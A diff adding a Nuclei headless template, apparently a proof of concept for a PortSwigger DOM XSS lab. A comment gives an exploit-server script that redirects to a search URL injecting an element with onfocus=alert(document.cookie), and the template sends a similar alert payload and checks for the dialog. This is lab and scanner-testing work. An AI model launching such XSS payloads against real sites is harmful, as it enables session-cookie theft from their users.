@@ -1,0 +1,30 @@
+# run with flag $ nuclei -headless
+# in exploit server:
+# <script>
+# location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+# </script>
+
+id: POC_lab-document-write-sink
+
+info:
+  name: dom_xss-lab-document-write-sink
+  author: FIR_UIII
+  severity: info
+  description: DOM XSS in document.write sink using source location.search
+  tags: XSS,portswigger
+
+headless:
+  - steps:
+      - args:
+          url: "{{BaseURL}}/?search=<xss+id%3Dx+onfocus%3Dalert%287%29%20tabindex=1>#x"
+        action: navigate
+
+      - action: waitdialog
+        name: reflected_topicId_query
+
+    matchers:
+      - type: dsl
+        dsl:
+          - reflected_topicId_query == true
+          - reflected_topicId_query_message == "7"
+        condition: and
